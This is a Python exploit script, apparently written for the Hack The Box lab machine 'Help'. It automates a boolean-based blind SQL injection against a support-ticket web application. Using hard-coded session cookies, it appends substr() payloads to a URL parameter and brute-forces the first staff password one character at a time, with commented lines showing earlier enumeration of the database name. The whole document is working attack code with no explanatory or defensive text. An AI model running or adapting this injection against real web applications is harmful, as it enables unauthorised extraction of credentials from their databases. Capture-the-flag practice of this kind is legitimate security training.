#!/usr/bin/python3

from pwn import *
import requests
from sys import exit
import string


def make_sqli():
    cookies = {
        "lang":"english",
        "PHPSESSID":"tn3edgkdlra8o9puqf0ttdls23",
        "usrhash":"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BFSyhLJrEsdcm4%2F9xhrD4nfEFD9kwpII16zhqE5khSfXw%3D%3D"
    }
    url = "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6"

    letters = list(string.ascii_lowercase + string.digits + string.punctuation)
    p1 = log.progress("Performing bruteforce over the database name")
    positions = range(1, 100)
    
    # database name found "support"
    # database_name = "support" and possible table login
    table_name = ""
    for position in positions:
        for letter in letters:
            # exploit = f" and substr(database(), {position}, 1)='{letter}'"
            exploit = f" and substr((select password from staff limit 0, 1), {position}, 1)='{letter}'-- -"
            # exploit = f" and substr(database(), {position}, 1)='{letter}'-- -"
            ress = requests.get(url=f"{url}{exploit}", cookies=cookies)
            if "Page not found - 404" not in ress.text:
                table_name += letter
                p1.status("column name : "+table_name)
                break




def main():
    try:
        make_sqli()
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        print("\n\n\t Exiting...")
        exit(0)


if __name__ == "__main__":
    main()
